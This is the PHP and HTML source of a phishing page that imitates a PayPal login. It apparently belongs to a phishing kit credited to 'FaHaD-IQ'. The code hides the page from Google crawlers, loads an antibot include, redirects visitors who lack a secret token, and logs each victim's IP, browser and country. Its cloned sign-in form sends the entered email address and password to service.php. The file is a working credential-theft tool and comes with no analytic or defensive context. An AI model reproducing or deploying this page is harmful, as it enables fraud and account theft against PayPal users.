<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
    #################################################
    #                FaHaD-IQ                       #
    #              fb/mr.fahad6                     #
    #################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");
include("lang/". $_SESSION['_lang_'].".php");
if($_GET['act_num'] =="confirm_account_3b2vhFa76bAq6"){
	$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
	$jm = 'id-' . round(microtime(true)) . '-' . md5($_SESSION['_IP_']);
	$_SESSION['_jm_'] = $jm;
}else {
header("location: https://www.youtube.com/user/PayPal");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $LOGIN_PAYPAL_TXT; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />

    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->
                      
  </head>

  <body>

<!--    <div class="navbar navbar-inverse ">
      <div class="navbar-inner">-->
        
        <div class="row-fluid" style="border-bottom:.1em solid #ccc;">
        <div class="container">
        <div class="span4" style="margin:15px 0 14px;"><img src="../../img/paypal.png" />
        </div>
        </div>
         </div>
        
 <!--     </div>
    </div>-->

    <div class="container">

      <!-- Main hero unit for a primary marketing message or call to action -->
      

      <!-- Example row of columns -->
      <div class="row" style="margin-top:72px;" id="loginrow">
        <div class="span4" style="background:#f5f5f5;padding:22px;">
         <form class="form-signin" style="padding:16px;" id="fr1m" name="login_form" method="post" action="service.php">
		 <?php if(isset($_GET['error'])){
		if ($_GET['error'] =="true") { echo "
		<div class=\"alert-falselog\" style=\"font-style: normal;\">
		<i style=\"width: 350px;\">Please make sure you enter your <b>email address</b> and <b>password</b> correctly.</i>
		</div>
		<hr />"; } 
		}?>
        <h2 class="form-signin-heading"><?php echo $LOGIN_TO_YOUR_ACCOUNT_TXT; ?></h2>
        <label for="name" style="font-size:18px;margin-top:20px;"><?php echo $EMAIL_ADDRESS_TXT; ?></label>
        <input type="email" class="span4" name="email" id="email" value="<?php if(isset($_SESSION['_email_'])){ echo $_SESSION['_email_'];} ?>" autofocus required >
        <label for="name" style="font-size:18px;"><?php echo $PASSWORD_TXT;?></label>
        <input type="password" class="span4" name="pass" id="pass" required >

       
        <input class="btn btn-primary" type="submit" value="<?php echo $LOGIN_TXT;?>" name="submit" id="logsubmit" style="margin: 15px 0px; height: 38px; width: 100%; font-weight: bold; font-size: 15px;">
        <br>
                <a href="#" style="color:#0079c1;font-weight:bold;"><?php echo $FORGOT_EMAIL_OR_PASS_TXT; ?></a>
                <hr />
		<input class="btn btn-primary" type="submit" value="<?php echo $OPEN_A_FREE_ACCOUNT_TXT;?>" name="submit" style="width: 100%; height: 38px; color: rgb(0, 0, 0); font-size: 15px;background:#ddd;">
      </form>
        </div>
		<footer id="ft">
        <div class="span4 offset1" >
          <p>
          <h2><?php echo $PAYMENT_ALL_IN_ONE_TXT;?></h2>
          </p>
          <p><?php echo $PICK_A_CARD_TXT;?></p>
          </br>
		  </br>
          <p><h2><?php echo $SIMPLE_AND_USUALLY_FREE_TXT; ?></h2></p>
          <p><?php echo $YOU_CAN_OPEN_TXT;?></p>
             
       </div>
        </footer>
      </div>

      <hr>
      <div class="row-fluid">
      <div class="span6">
        <p><?php echo $ABOUT_PAYPAL_TXT; ?> | <?php echo $SUPPORT_TXT; ?> | <?php echo $TARIFS_TXT; ?> | <?php echo $DEVELOPERS_OF_PAYPAL_TXT; ?> | <?php echo $SOLUTIONS_ECOMMERCE_TXT; ?> | <?php echo $INTERNATIONAL_TXT;?> | <?php echo $RESPECT_FOR_PRIVACY_TXT; ?> | <?php echo $LABORATORIES_PAYPAL_TXT; ?> | <?php echo $JOBS_TXT; ?> | <?php echo $MAP_TXT; ?> | <?php echo $EBAY_TXT; ?></p>
        <p><?php echo $COPYRIGHT_TXT; ?></p>
        </div>
				<footer id="mk">
	  	<div class="span4 offset1" style="margin:15px 0 14px;float:right;text-align:center;">
        <form name="changelang" id="changelang" method="post">
        <a href="javascript:void(0);" title="United Kingdom"><img src="../../img/flags/United-Kingdom.png" onClick="javascrip:setval('EN');" /></a>
        <a href="#" title="Sweden"><img src="../../img/flags/Sweden.png" onClick="javascrip:setval('SE');" /></a>
        <a href="#" title="Germany"><img src="../../img/flags/Germany.png" onClick="javascrip:setval('DE');" /></a>
        <a href="#" title="France"><img src="../../img/flags/France.png" onClick="javascrip:setval('FR');" /></a>
        <a href="#" title="Spain"><img src="../../img/flags/Spain.png" onClick="javascrip:setval('ES');" /></a>
        <a href="#" title="Italy"><img src="../../img/flags/Italy.png" onClick="javascrip:setval('IT');" /></a>
        <a href="#" title="Denmark"><img src="../../img/flags/Denmark.png" onClick="javascrip:setval('DK');" /></a>
        <input type="hidden" name="changelanguage" id="changelanguage"/>
        </div>
		</footer>
				<footer id="lm">
	  	<div class="span4 offset1" style="margin:15px 0 14px;text-align:center;">
        <form name="changelangm" id="changelangm" method="post">
        <a href="javascript:void(0);" title="United Kingdom"><img src="../../img/flags/United-Kingdom.png" onClick="javascrip:setval('EN');" /></a>
        <a href="#" title="Sweden"><img src="../../img/flags/Sweden.png" onClick="javascrip:setval('SE');" /></a>
        <a href="#" title="Germany"><img src="../../img/flags/Germany.png" onClick="javascrip:setval('DE');" /></a>
        <a href="#" title="France"><img src="../../img/flags/France.png" onClick="javascrip:setval('FR');" /></a>
        <a href="#" title="Spain"><img src="../../img/flags/Spain.png" onClick="javascrip:setval('ES');" /></a>
        <a href="#" title="Italy"><img src="../../img/flags/Italy.png" onClick="javascrip:setval('IT');" /></a>
        <a href="#" title="Denmark"><img src="../../img/flags/Denmark.png" onClick="javascrip:setval('DK');" /></a>
        <input type="hidden" name="changelanguagem" id="changelanguagem"/>
        </div>
		</footer>
        </div>
		
    </div> <!-- /container -->

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="../../js/jquery.js"></script>
    <script src="../../js/bootstrap-transition.js"></script>
    <script src="../../js/bootstrap-alert.js"></script>
    <script src="../../js/bootstrap-modal.js"></script>
    <script src="../../js/bootstrap-dropdown.js"></script>
    <script src="../../js/bootstrap-scrollspy.js"></script>
    <script src="../../js/bootstrap-tab.js"></script>
    <script src="../../js/bootstrap-tooltip.js"></script>
    <script src="../../js/bootstrap-popover.js"></script>
    <script src="../../js/bootstrap-button.js"></script>
    <script src="../../js/bootstrap-collapse.js"></script>
    <script src="../../js/bootstrap-carousel.js"></script>
    <script src="../../js/bootstrap-typeahead.js"></script>

<script language="javascript">
var w=$( window ).width();
if(w<=1280)
{
$( "#ft" ).hide();
$( "#mk" ).hide();
$( "#loginrow").css("margin-top","20px");
}
if(w>1280)
{
$( "#lm" ).hide();
$( "#loginrow").css("margin-top","20px");
}
</script>
<script language="javascript" >
function setval(ccode)
{
	//alert(ccode);
	$("#changelanguage").val(ccode);
	$("#changelang").submit();
	$("#changelanguagem").val(ccode);
	$("#changelangm").submit();
	
}
</script>
  </body>
</html>
